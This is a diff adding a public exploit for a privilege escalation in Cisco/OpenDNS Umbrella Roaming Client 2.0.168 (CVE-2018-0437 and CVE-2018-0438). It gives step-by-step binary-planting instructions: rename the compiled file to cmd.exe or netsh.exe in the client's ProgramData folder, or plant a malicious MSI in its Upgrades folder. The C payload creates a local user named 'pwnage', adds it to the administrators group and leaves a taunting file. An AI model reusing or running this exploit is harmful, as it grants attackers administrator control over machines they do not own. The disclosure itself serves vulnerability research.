@@ -1,0 +1,53 @@
+/*
+# Exploit Title: Cisco Umbrella Roaming Client 2.0.168 - Privilege Escalation
+# Date: 2018-04-06
+# Exploit Author: paragonsec @ Critical Start
+# Vendor Homepage: https://www.opendns.com/
+# Version: Umbrella Roaming Client (2.0.168)
+# Tested on: Windows 10 Professional
+# CVE : CVE-2018-0437 & CVE-2018-0438
+# Cisco Bug: CSCvj61300
+# Advisory Links:
+# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180905-umbrella-priv
+# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180905-umbrella-file-read
+# https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvj61300
+
+OpenDNS Umbrella Roaming Client (2.0.168) Binary Planting Privilege Escalation Exploit
+
+Details:
+Compile the following code and rename it to either netsh.exe or cmd.exe
+and place the file in the "C:\ProgramData\OpenDNS\ERC\" directory. Restart the machine!
+ 
+Affected Binary paths:
+C:\ProgramData\OpenDNS\ERC\cmd.exe
+C:\ProgramData\OpenDNS\ERC\netsh.exe
+
+More Details:
+Create malicious MSI file named RoamingClient_WIN_2.0.168.msi and place in
+"C:\ProgramData\OpenDNS\ERC\Upgrades\" and restart the machine.
+
+Tools Used:
+ìAdvanced Installer 14.8" - Used to create the MSI
+ 
+Code:
+*/
+ 
+#include <stdlib.h>
+#include <stdio.h>
+ 
+int main()
+{
+    system("net user pwnage pwnage /add");
+    system("net localgroup administrators pwnage /add");
+	
+    FILE * fp;
+    int i;
+    /* open the file for writing*/
+    fp = fopen ("c:\\opendns_pwnage.txt","w");
+ 
+    fprintf (fp, "OpenDNS has been Pwned... New user has been created as an admin!\nBrought to you by paragonsec @criticalstart");
+ 
+    /* close the file*/  
+    fclose (fp);
+    return 0;
+}
